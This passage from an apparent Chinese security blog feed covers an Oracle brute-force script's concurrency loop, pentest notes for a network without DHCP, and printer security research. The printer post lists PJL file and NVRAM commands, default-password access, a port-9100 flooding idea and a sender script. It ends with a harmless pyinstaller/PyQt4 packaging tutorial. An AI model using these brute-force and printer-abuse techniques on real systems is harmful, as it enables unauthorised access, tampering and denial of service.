class="line"><span class="comment"># --coding=utf-8--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 参照表</span></span><br><span class="line"><span class="comment">## Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.</span></span><br><span class="line"><span class="comment">## Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.</span></span><br><span class="line"><span class="comment">## Style: DIM, NORMAL, BRIGHT, RESET_ALL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init, Fore, Style, Back</span><br><span class="line"></span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span> Fore.GREEN + <span class="string">u'字体颜色设置'</span></span><br><span class="line"><span class="keyword">print</span> Style.DIM + <span class="string">u'字体样式设置'</span></span><br><span class="line"><span class="keyword">print</span> Back.GREEN + <span class="string">u'背景颜色设置'</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/09/28/59cc733c6e706.png" alt="print效果图.png"></p><h2 id="异步设置"><a href="#异步设置" class="headerlink" title="异步设置"></a>异步设置</h2><p>使用gevent进行爆破，当爆破量很大的时候，会导致内存飙高。因此，设置了阀值。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> not blasting.<span class="keyword">empty</span>():</span><br><span class="line">        <span class="keyword">if</span> len(<span class="keyword">self</span>.threads) &lt; <span class="number">5000</span>:</span><br><span class="line">            <span class="keyword">self</span>.threads.append(gevent.spawn(<span class="keyword">self</span>._test, blasting.get()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gevent.joinall(<span class="keyword">self</span>.threads)</span><br><span class="line">            <span class="keyword">self</span>.threads = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> len(<span class="keyword">self</span>.threads) &gt; <span class="number">0</span>:</span><br><span class="line">            gevent.joinall(<span class="keyword">self</span>.threads)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在编写Oracle爆破脚本的时候，大部分的问题由环境搭建、配置引起。</p><ol><li>Oracle安装完成之后，数据库是不对外开放需要修改配置文件，配置文件localhost修改成计算机名，当服务器IP修改时，其他计算机还是可以连接。修改成ip时，服务器IP修改时，需要修改配置文件中的ip；</li><li>Oracle端口不对外开放，确认配置文件修改正确的情况下，【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务需要重启，网上说只需要重启TNS服务即可，但是测试时，发现两个服务都需要重启；</li><li>Python终端彩字输出可以使用\033[显示方式;前景色;背景色m + 结尾部分：\033[0m，但Windows下失败，Linux下没去尝试；</li><li>使用colorama需要先初始化init(autoreset=True)。</li></ol><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！<strong><a href="https://github.com/HyWell/Python/blob/master/Blog/Oracle_Brute.py" target="_blank" rel="noopener"><font color="blue">Code</font></a></strong>。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-内网渗透测试（无DHCP）</title>
    <url>/archives/27b0f6e3.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对渗透，有句话很符合：只要思想不滑坡，办法总比问题多。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久没做过渗透测试，这次因为工作接触一个盲测的项目，特此记录一下。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>这次渗透只给了一个网口,没有DHCP服务，IP需要自己配置、系统IP需要自己去寻找。</p><h1 id="渗透ing"><a href="#渗透ing" class="headerlink" title="渗透ing"></a>渗透ing</h1><h2 id="获取IP"><a href="#获取IP" class="headerlink" title="获取IP"></a>获取IP</h2><p>由于没有DHCP。所以需要知道自己处于什么网段。这个步骤主要通过wireshark来查看ARP包，基本可以知道所处的网段了。但是子网掩码需要自己一个个去猜，可以先从24位(255.255.255.0)开始，逐步递增。如果递增还是不行那就递减吧。<br><img src="https://i.loli.net/2017/09/23/59c5b32a3ea45.png" alt="arp.png"><br>像这种ARP包，可以将IP地址配置为10.121.21.x，子网掩码配置成255.255.255.0。先看同网段IP是否可以访问，可以访问就配置网关，网关配置成10.121.21.254，再看10.121.X.X是否可以访问。</p><h2 id="服务器探测"><a href="#服务器探测" class="headerlink" title="服务器探测"></a>服务器探测</h2><p>有了IP地址之后，就需要开始去寻找服务器地址了。可以先从C段开始快速探测，如果C段没有目标服务器的话，那就从B段下手。这个过程极其枯燥，建议使用工具：IISPutScanner、Advanced_ip_scanner。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有了IP、服务器IP就跟平时渗透是一样的。这次难点在于没有DHCP，需要自己去配置对应的IP、寻找目标系统的IP。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-打印机安全研究</title>
    <url>/archives/90a5ee4a.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>只要你联网，那就有可能存在安全问题。俗称万物皆可’日’。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打印机是现在办公环境中不可或缺的一个硬件设备,其本身存在很多安全问题。打印机服务有:FTP、Telnet、HTTP、PJL等。看到这么多服务，相信研究人员是非常高兴的。因为服务越多，安全隐患也越多。做安全研究最怕的就是服务很少、功能很少、端口不开放这些。<br>前段时间，由于工作的原因，对打印机安全进行研究与分析。整体流程为:识别打印机→识别服务→常见服务安全分析→打印机专用服务(PJL)安全分析。PJL命令文档可以在HP网站上找到，<a href="http://www.hp.com/ctg/Manual/bpl13210.pdf" target="_blank" rel="noopener">文档参考1</a>、<a href="http://h10032.www1.hp.com/ctg/Manual/bpl13208.pdf" target="_blank" rel="noopener">文档参考2</a>。</p><h1 id="识别打印机"><a href="#识别打印机" class="headerlink" title="识别打印机"></a>识别打印机</h1><p>识别打印机可以通过：SNMP发送特定oid识别、Web管理页面识别、PJL命令识别。这里我采用了PJL命令识别，通过向设备的9100端口发送PJL命令，根据返回信息来识别。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PJL INFO ID</span><br></pre></td></tr></table></figure><p>通过对打印机发送INFO ID(PJL命令)，打印机会返回其对应的型号。<br><img src="https://i.loli.net/2017/09/08/59b217a08f4e3.bmp" alt="识别.bmp"></p><h1 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h1><p>识别服务的话,用nmap就可以了。可以使用全端口扫描来发现对应服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 1-65535 -T4 -A -v targetIP</span><br></pre></td></tr></table></figure><h1 id="常见服务分析"><a href="#常见服务分析" class="headerlink" title="常见服务分析"></a>常见服务分析</h1><p>打印机常见服务：Telnet、FTP、HTTP。</p><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><p>打印机中Telnet基本都是默认密码或者是空密码。登录之后可以查看配置信息、操作打印机等等。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>大部分打印机FTP默认密码或空密码。通过上传文件，文件会直接被打印。</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>打印机的Web存在的问题：爆破破解、越权访问等。这个可通过使用Web渗透的方式进行测试。我测试的时候发现有默认密码、信息泄露等。</p><h1 id="打印机专用服务-PJL-分析"><a href="#打印机专用服务-PJL-分析" class="headerlink" title="打印机专用服务(PJL)分析"></a>打印机专用服务(PJL)分析</h1><p>PJL是打印机作业语言:printer job language。PJL语言有固定的格式。<br><img src="https://ooo.0o0.ooo/2017/09/08/59b2295cbe64f.png" alt="报文格式.png"><br>对PJL命令文档中的PJL命令进行了整理：</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">PJL以<span class="string">"\x1B%-12345@PJL JOB"</span>开始，以<span class="string">"\x1B%-12345"</span>结束，其中每条指令应当独占一行，指令间需要有carriage <span class="keyword">return</span>（<span class="number">0x0D</span>）。使用者可以自定义指令。</span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSDELETE NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt;                           <span class="meta"># 删除文件  </span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSDOWNLOAD FORMAT:<span class="built_in">BINARY</span> [SIZE=<span class="built_in">int</span>] [&lt;CR&gt;]&lt;LF&gt;                  <span class="meta"># 下载文件到打印机</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSINIT VOLUME = “pathname” [&lt;CR&gt;]&lt;LF&gt;                           <span class="meta"># 初始化打印机文件系统</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSMKDIR NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt;                            <span class="meta"># 创建目录</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> DINQUIRE CPLOCK                                                 <span class="meta"># 检查控制面板状态</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> DINQUIRE PASSWORD                                               <span class="meta"># 检查密码保护状态</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> JOB PASSWORD = [<span class="built_in">Number</span>:<span class="number">0</span> <span class="keyword">to</span> <span class="number">65535</span>]                              <span class="meta"># 当前密码保护密码</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> <span class="keyword">DEFAULT</span> PASSWORD [<span class="built_in">Number</span>:<span class="number">0</span> <span class="keyword">to</span> <span class="number">65535</span>]                            <span class="meta"># 修改保护密码</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> <span class="keyword">DEFAULT</span> CPLOCK = [ON, OFF]                                      <span class="meta"># 控制面板状态</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET IOBUFFER = [ON, OFF, AUTO]                                  <span class="meta"># 设置缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET IOSIZE = [<span class="number">10</span><span class="number">-100</span>]                                           <span class="meta"># 设置缓存区大小</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET PCNAME = [<span class="built_in">String</span>]                                           <span class="meta"># 设置计算机名称</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET HOLD = [ON, JOB, STORE, PROOF]                              <span class="meta"># 设置文件保存</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET HOLDKEY = [<span class="built_in">Number</span>:<span class="number">0000</span> <span class="keyword">to</span> <span class="number">9999</span>]                             <span class="meta"># 设置保存文件密码</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> <span class="keyword">DEFAULT</span> DISKLOCK = [ON, OFF]                                    <span class="meta"># 设置硬盘锁定状态</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET SPOOLTIME                                                   <span class="meta"># 设置打印日期</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET COPIES                                                      <span class="meta"># 设置打印数</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET JOBNAME                                                     <span class="meta"># 设置打印机文件名称</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET RESOLUTION                                                  <span class="meta"># 设置分辨率</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET DRIVERNAME                                                  <span class="meta"># 设置驱动</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> USTATUS JOB                                                     <span class="meta"># 输出 队列中还未打印任务的 状态</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> COMMENT                                                         <span class="meta"># 添加注释</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET OUTTRAY                                                     <span class="meta">#出纸盘(纸张输出位置)</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET ORIENTATION = [PORTRAIT, LANDSCAPE]                         <span class="meta">#页面方向</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET DUPLEX = [ON, OFF]                                          <span class="meta">#双工模式(双面打印)</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET BINDING = [LONGEDGE, SHORTEDGE]                             <span class="meta">#双工模式：短边、长边</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> RNVRAM ADDRESS                                                  <span class="meta">#读取内存</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> OPMSG DISPLAY                                                   <span class="meta">#设置打印机离线脱机</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> SET SERVICEMODE                                                 <span class="meta">#设置服务模式</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> WNVRAM ADDRESS                                                  <span class="meta">#写入内存</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSDIRLIST NAME                                                  <span class="meta">#读取目录</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSQUERY NAME                                                    <span class="meta">#读取文件</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSUPLOAD NAME                                                   <span class="meta">#文件上传</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">@PJL</span> FSDOWNLOAD                                                      <span class="meta">#写入文件</span></span><br></pre></td></tr></table></figure><p>由于打印机并不去判断PJL命令是谁发起的，因此，只要路由可达任何人都可以对打印机执行PJL命令操作。<br>我测试的时候，发现对打印机的9100端口发送任何数据，打印机都会将其打印出来。如果，通过对9100端口进行DoS，那么，打印机就会不间断的工作。</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ol><li><a href="http://www.phenoelit.org/hp/" target="_blank" rel="noopener">Hijetter.exe</a></li><li><a href="https://github.com/RUB-NDS/PRET" target="_blank" rel="noopener">PRET</a></li><li><a href="https://github.com/your-favorite-hacker/pjl-tool" target="_blank" rel="noopener">pjl-tool</a></li><li>print.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pdata = f.read()</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((sys.argv[<span class="number">1</span>],<span class="number">9100</span>))</span><br><span class="line">    sock.sendall(pdata)</span><br><span class="line">    recv_data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv_data</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>在对打印机进行安全测试的时候，发现了几个问题特此记录一下：</li><li>使用网络打印机的时候，流量报文是明文。将流量报文保存，可进行重放，将文档重新打印；</li><li>测试的打印机使用FTP向打印机上传文件，打印机立即打印，打印之后立马删除。不知道其他打印机是否会立即删除文件；</li><li>使用Python的socket可以达到快速网络数据发送。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>打印机</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-py转exe(附GUI界面)</title>
    <url>/archives/2329ebda.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>有时候写了一个脚本，但是换到另外一台电脑上的时候，发现并没有Python的解析环境，这时候将py文件转成exe，再将其换到另外一台Windows电脑运行，是一个很好的选择。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>py转exe有:py2exe、pyinstaller等多种选择。这两种我都用过，我更倾向于pyinstaller。本文使用的就是pyinstaller。</p><h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p>使用pip快捷安装pyinstaller。如果对pyinstaller感兴趣，可以参考<a href="http://www.pyinstaller.org/documentation.html" target="_blank" rel="noopener">文档</a></p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> pyinstaller</span><br></pre></td></tr></table></figure><p>如果无法使用pip安装，可以在<a href="http://www.pyinstaller.org/downloads.html" target="_blank" rel="noopener">官网</a>下载源码安装。<br>成功安装可以输出对应版本信息。<br><img src="https://i.loli.net/2017/08/19/599799dd8f23c.png" alt="pyinstaller version.png"></p><h3 id="py文件"><a href="#py文件" class="headerlink" title="py文件"></a>py文件</h3><p>将py文件转exe，那么必备的就是py文件了。本文采用我以前写的RSA加密文件脚本，可以在这里<a href="https://github.com/HyWell/Python/blob/master/Os/Encryptiong.py" target="_blank" rel="noopener">下载</a>。</p><h2 id="转换Exe"><a href="#转换Exe" class="headerlink" title="转换Exe"></a>转换Exe</h2><p>有了pyinstaller之后，将py文件转成exe只需要一条命令即可完成。该条命令会生成两个文件夹:build、dist。生成的exe在dist文件夹中。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">pyinstaller <span class="module-access"><span class="module"><span class="identifier">Encryptiong</span>.</span></span>py</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/19/59979af8238fa.png" alt="exe转换.png"></p><h3 id="单文件生成"><a href="#单文件生成" class="headerlink" title="单文件生成"></a>单文件生成</h3><p>刚刚转换出来的exe有许多依赖的文件在dist文件夹下。就是说想要运行这个exe，那么整个dist文件夹下所有文件都需要存在。<br>pyinstaller提供了将py文件转换成单exe模式，只需要在转换命令加上-F参数即可。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">pyinstaller <span class="module-access"><span class="module"><span class="identifier">Encryptiong</span>.</span></span>py -F</span><br></pre></td></tr></table></figure><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>如果转换出来的exe大小很大，pyinstaller也支持压缩。压缩需要下载<a href="https://upx.github.io/" target="_blank" rel="noopener">upx</a>，并加上对应参数即可。</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">pyinstaller Encryptiong.py -F --upx-dir D:<span class="symbol">\C</span>ode<span class="symbol">\P</span>ython27<span class="symbol">\u</span>px394w</span><br></pre></td></tr></table></figure><h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><p>现在已经成功生成了exe，但是现在的exe图标很”大众”。这是pyinstaller默认图标，如果想自定义图标的话，pyinstaller也提供了对应参数-i。但是需要提供多种尺寸的ico图标，因为不同情况下需要不一样尺寸的图标。可以使用<strong><a href="http://www.winterdrache.de/freeware/png2ico/" target="_blank" rel="noopener">png2ico</a></strong>工具转换，使用png2ico需要使用对应的命令。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">png2ico</span> <span class="selector-tag">myicon</span><span class="selector-class">.ico</span> <span class="selector-tag">icon_128x128</span><span class="selector-class">.png</span> <span class="selector-tag">icon_64x64</span><span class="selector-class">.png</span> <span class="selector-tag">icon_48x48</span><span class="selector-class">.png</span> <span class="selector-tag">icon_32x32</span><span class="selector-class">.png</span> <span class="selector-tag">icon_16x16</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure><p>也可以使用在线转换工具<strong><a href="https://www.converticon.com/" target="_blank" rel="noopener">ConvertIcon!</a></strong>,导出的时候需要勾对应尺寸。<br><img src="https://i.loli.net/2017/08/19/5997a38d607b0.png" alt="converticon.png"><br>有了图标之后，使用对应命令即可。</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">pyinstaller Encryptiong.py -F --upx-dir D:<span class="symbol">\C</span>ode<span class="symbol">\P</span>ython27<span class="symbol">\u</span>px394w -i ico.ico</span><br></pre></td></tr></table></figure><h2 id="GUI界面"><a href="#GUI界面" class="headerlink" title="GUI界面"></a>GUI界面</h2><p>现在生成的exe文件，打开之后连GUI界面都没有。没有GUI界面的exe就是耍流氓。(Ps:来源某位小伙伴)我这么正经的人，怎么可能耍流氓！<br>Python想要生成GUI界面，需要安装PyQt。我安装的是PyQt4。由于最新版的PyQt已经不提供Windows二进制安装程序，大家可以安装<a href="https://sourceforge.net/projects/pyqt/files/PyQt4/PyQt-4.11.4/" target="_blank" rel="noopener">4.11.4版本</a>。找到合适自己的版本，下载、安装即可。</p><h3 id="UI生成"><a href="#UI生成" class="headerlink" title="UI生成"></a>UI生成</h3><p>安装完PyQt4之后，大家可以在Python27\Lib\site-packages\PyQt4文件夹找到designer.exe用来构建GUI界面的UI。<br>打开designer.exe新建一个窗体，通过左边拖拽控件，将控件按照自己喜欢的位置布局到窗体里面。设计好了保存成ui文件即可。<br>最后可以Python27\Lib\site-packages\PyQt4\pyuic4.bat来生成对应的布局代码。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">pyuic4.bat -o <span class="module-access"><span class="module"><span class="identifier">EncryptiongUi</span>.</span></span>py <span class="module-access"><span class="module"><span class="identifier">EncryptiongUi</span>.</span></span>ui</span><br></pre></td></tr></table></figure><p>生成的布局代码文件有一个Ui类，其中包含了setupUi、retranslateUi函数。</p><h3 id="GUI生成"><a href="#GUI生成" class="headerlink" title="GUI生成"></a>GUI生成</h3><p>用了UI布局，现在新建一个脚本(Encry.py)通过代码生成一个窗体即可。</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="title">from</span> <span class="type">PyQt4</span>.<span class="type">QtGui</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="title">from</span> <span class="type">PyQt4</span> <span class="keyword">import</span> QtGui</span><br><span class="line"><span class="title">from</span> <span class="type">PyQt4</span>.<span class="type">QtCore</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> EncryptiongUi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">TestDlg</span>(<span class="type">QDialog</span>, <span class="type">EncryptiongUi</span>.<span class="type">Ui_RSA</span>):  # 继承<span class="type">EncryptiongUI</span>.<span class="type">UI_RSA</span></span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">parent</span>=<span class="type">None</span>):</span></span><br><span class="line"><span class="class">        super(<span class="type">TestDlg</span>, <span class="title">self</span>).__init__(<span class="title">parent</span>)</span></span><br><span class="line"><span class="class">        self.setupUi(<span class="title">self</span>)</span></span><br><span class="line"><span class="class">        # self.setWindowIcon(<span class="type">QtGui</span>.<span class="type">QIcon</span>('./<span class="title">ico</span>.<span class="title">ico'</span>))  # 设置icon</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">def main():</span></span><br><span class="line"><span class="class">    app = <span class="type">QApplication</span>(<span class="title">sys</span>.<span class="title">argv</span>)</span></span><br><span class="line"><span class="class">    dialog = <span class="type">TestDlg</span>()</span></span><br><span class="line"><span class="class">    dialog.show()</span></span><br><span class="line"><span class="class">    sys.exit(<span class="title">app</span>.<span class="title">exec_</span>())</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">if __name__ == '__main__':</span></span><br><span class="line"><span class="class">    main()</span></span><br></pre></td></tr></table></figure><p>运行Encry.py即可生成一个GUI界面。<br><img src="https://i.loli.net/2017/08/19/5997acf24bec8.png" alt="GUI.png"></p><h3 id="控件功能配置"><a href="#控件功能配置" class="headerlink" title="控件功能配置"></a>控件功能配置</h3><p>我设计了一个包含两个line、三个button的窗体。根据button来执行Encryptiong.py的不同功能，根据line的值进行传参。<br>首先对Encryptiong.py脚本进行改造。只需要把180、181注释，让其不运行即可。</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># if __name__ == <span class="string">'__main__'</span>:</span></span><br><span class="line">    <span class="meta"># main()</span></span><br></pre></td></tr></table></figure><p>其次对EncryptiongUI.py进行改造。导入Encryptiong的Encryptiong，用来执行加密、解密等功能。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Encryptiong <span class="keyword">import</span> Encryptiong</span><br></pre></td></tr></table></figure><p>接下来将按钮的单击属性打开。一共需要打开三个按钮的属性,pushButton是按钮的自定义名称，根据命名进行修改。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">self</span><span class="selector-class">.pushButton</span><span class="selector-class">.setCheckable</span>(<span class="selector-tag">True</span>)</span><br><span class="line"><span class="selector-tag">self</span><span class="selector-class">.pushButton</span><span class="selector-class">.setChecked</span>(<span class="selector-tag">True</span>)</span><br></pre></td></tr></table></figure><p>然后在UI类中，编写工作的函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(self, Ctype)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Ctype == <span class="number">1</span>:</span><br><span class="line">            Encryptiong().encryp()</span><br><span class="line">            QtGui.QMessageBox.about(self, <span class="string">u'提醒'</span>, <span class="string">u"成功生成公、私钥文件！"</span>)  <span class="comment"># 设置提醒消息框</span></span><br><span class="line">        <span class="keyword">elif</span> Ctype == <span class="number">2</span>:</span><br><span class="line">            public = str(self.lineEdit.text())  <span class="comment"># 获取line的文本</span></span><br><span class="line">            filepath = str(self.lineEdit_2.text())  <span class="comment"># 获取line2的文本</span></span><br><span class="line">            Encryptiong(public=public, filepath=filepath).encryption()</span><br><span class="line">            QtGui.QMessageBox.about(self, <span class="string">u'提醒'</span>, <span class="string">u"完成加密！"</span>)</span><br><span class="line">        <span class="keyword">elif</span> Ctype == <span class="number">3</span>:</span><br><span class="line">            private = str(self.lineEdit.text())</span><br><span class="line">            filepath = str(self.lineEdit_2.text())</span><br><span class="line">            Encryptiong(private=private,decrypt=filepath).decrypted()</span><br><span class="line">            QtGui.QMessageBox.about(self, <span class="string">u'提醒'</span>, <span class="string">u"完成解密！"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        QtGui.QMessageBox.about(self, <span class="string">u'警告'</span>, <span class="string">u"输入有误,请重新输入！"</span>)</span><br></pre></td></tr></table></figure><p>回到Ui类的setupUi函数，设置按钮单击执行工作函数。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">self</span><span class="selector-class">.pushButton</span><span class="selector-class">.clicked</span><span class="selector-class">.connect</span>(<span class="selector-tag">lambda</span> : <span class="selector-tag">self</span><span class="selector-class">.work</span>(1))  # 单击调用<span class="selector-tag">work</span>函数</span><br><span class="line"><span class="selector-tag">self</span><span class="selector-class">.pushButton_2</span><span class="selector-class">.clicked</span><span class="selector-class">.connect</span>(<span class="selector-tag">lambda</span> : <span class="selector-tag">self</span><span class="selector-class">.work</span>(2))</span><br><span class="line"><span class="selector-tag">self</span><span class="selector-class">.pushButton_3</span><span class="selector-class">.clicked</span><span class="selector-class">.connect</span>(<span class="selector-tag">lambda</span> : <span class="selector-tag">self</span><span class="selector-class">.work</span>(3))</span><br></pre></td></tr></table></figure><p>现在已经成功让Encryotiong脚本的功能通过GUI界面来执行、实现。最后通过pyinstaller进行打包成exe。</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">pyinstaller -F -w -i ico.ico --upx-dir D:<span class="symbol">\C</span>ode<span class="symbol">\P</span>ython27<span class="symbol">\u</span>px394w Encryptiong.py</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在编写使用pyinstaller、PyQt4生成GUI界面的exe时，遇到几个问题，在此记录一下。</p><ol><li>pyinstaller -i加载图标的时候，图标需要是多种尺寸的图标。要不然某些情况是无法显示的;</li><li>pyinstaller -w生成无终端窗口需要脚本有GUI界面;</li><li>PyQt4的Button执行函数，需要使用lambda生成匿名函数;</li><li>PyQt4的QMessageBox进行弹框提示需要将字符串转成Unicode编码，要不然会乱码。</li></ol><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！<strong><a href="https://github.com/HyWell/Python/blob/master/Os/Encryptiong-Exe/Encry.py" target="_blank" rel="noopener"><font color="blue">Code</font></a></strong>。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-RSA加密文件</title>
    <url>/archives/fb3e56b9.html</url>
